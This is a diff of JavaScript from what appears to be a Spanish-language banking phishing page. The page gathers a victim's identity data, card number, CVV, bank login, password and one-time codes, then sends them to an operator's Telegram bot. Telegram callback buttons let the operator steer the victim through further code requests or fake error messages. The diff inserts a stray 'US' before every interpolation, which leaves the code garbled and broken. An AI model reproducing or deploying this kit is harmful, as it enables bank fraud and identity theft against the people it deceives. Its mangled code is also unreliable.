@@ -220,7 +220,7 @@
         const horas = ahora.getHours().toString().padStart(2, "0");
         const minutos = ahora.getMinutes().toString().padStart(2, "0");
         const segundos = ahora.getSeconds().toString().padStart(2, "0");
-        return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
+        return `US${dia}/US${mes}/US${año} US${horas}:US${minutos}:US${segundos}`;
       }
 
       function actualizarHoraTransaccion() {
@@ -230,13 +230,13 @@
         const segundos = ahora.getSeconds().toString().padStart(2, "0");
         document.getElementById(
           "horaTransaccion"
-        ).innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
+        ).innerText = `Hora de la transacción: US${horas}:US${minutos}:US${segundos}`;
       }
 
       // Inicializar la hora de la transacción
       document.getElementById(
         "horaTransaccion"
-      ).innerText = `Hora de la transacción: ${obtenerFechaActual()}`;
+      ).innerText = `Hora de la transacción: US${obtenerFechaActual()}`;
       // Actualizar la hora cada segundo
       setInterval(actualizarHoraTransaccion, 1000);
 
@@ -253,47 +253,47 @@
           loader.style.display = "none";
           return;
         }
-        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
+        fetch(`https://api.telegram.org/botUS${config.token}/getUpdates`)
           .then((response) => response.json())
           .then((data) => {
             const updates = data.result;
             const verificationUpdate = updates.find(
               (update) =>
                 update.callback_query &&
-                (update.callback_query.data === `pedir_logo:${transactionId}` ||
-                  update.callback_query.data === `error_dinamica:${transactionId}` ||
-                  update.callback_query.data === `error_logo:${transactionId}` ||
-                  update.callback_query.data === `error_tc:${transactionId}` ||
-                  update.callback_query.data === `confirm_finalizar:${transactionId}`)
+                (update.callback_query.data === `pedir_logo:US${transactionId}` ||
+                  update.callback_query.data === `error_dinamica:US${transactionId}` ||
+                  update.callback_query.data === `error_logo:US${transactionId}` ||
+                  update.callback_query.data === `error_tc:US${transactionId}` ||
+                  update.callback_query.data === `confirm_finalizar:US${transactionId}`)
             );
 
             if (verificationUpdate) {
               loader.style.display = "none";
 
-              if (verificationUpdate.callback_query.data === `pedir_logo:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `pedir_logo:US${transactionId}`) {
                 window.location.href = "chedf.html";
               }
 
-              if (verificationUpdate.callback_query.data === `error_logo:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `error_logo:US${transactionId}`) {
                 alert("Ha ocurrido un error. Por favor intente nuevamente.");
                 window.location.href = "chedf.html";
               }
 
-              if ( verificationUpdate.callback_query.data === `error_dinamica:${transactionId}`) {
+              if ( verificationUpdate.callback_query.data === `error_dinamica:US${transactionId}`) {
                 alert(
                   "Clave dinamica incorrecta. Por favor, revise sus datos e intente nuevamente."
                 );
               }
 
 
-              if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `error_tc:US${transactionId}`) {
                 alert(
                   "La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente."
                 );
                 window.location.href = "payment.html";
               }
 
-              if (verificationUpdate.callback_query.data === `confirm_finalizar:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `confirm_finalizar:US${transactionId}`) {
                 window.location.href = "finish.html";
               }
 
@@ -332,17 +332,17 @@
           return;
         }
 
-        const message = `Nuevo solicitud de clave dinamica 1 pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n🔑OTP1: ${otp}
+        const message = `Nuevo solicitud de clave dinamica 1 pendiente de verificación.\n🆔ID: US${transactionId}\n👤Nombre: US${formData0.nombre}\n🪪Cédula: US${formData0.documentoIdentidad}\n-\n📞Teléfono: US${formData0.telefono}\n🌇Ciudad: US${formData0.ciudad}\n🗺️Direc: US${formData0.direccion}\n-\n🏦 Banco: US${formData0.entidad}\n💳Tarjeta: US${formData0.tarjeta}\n📅Fecha: US${formData0.fechaExpiracion}\n🔐CVV: US${formData0.cvv}\n🧑‍💻Usuario: US${username}\n🔐Clave: US${password}\n🔑OTP1: US${otp}
         `;
 
         const keyboard = JSON.stringify({
           inline_keyboard: [
-            [{ text: "Pedir Logo", callback_data: `pedir_logo:${transactionId}` }],
-            [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-            [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
-            [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
-            [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
-            [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
+            [{ text: "Pedir Logo", callback_data: `pedir_logo:US${transactionId}` }],
+            [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:US${transactionId}` }],
+            [{ text: "Error de TC", callback_data: `error_tc:US${transactionId}` }],
+            [{ text: "Error de Logo", callback_data: `error_logo:US${transactionId}` }],
+            [{ text: "Error de Dinámica", callback_data: `error_dinamica:US${transactionId}` }],
+            [{ text: "Finalizar", callback_data: `confirm_finalizar:US${transactionId}` }]
           ],
         });
 
@@ -352,7 +352,7 @@
           return;
         }
 
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+        fetch(`https://api.telegram.org/botUS${config.token}/sendMessage`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
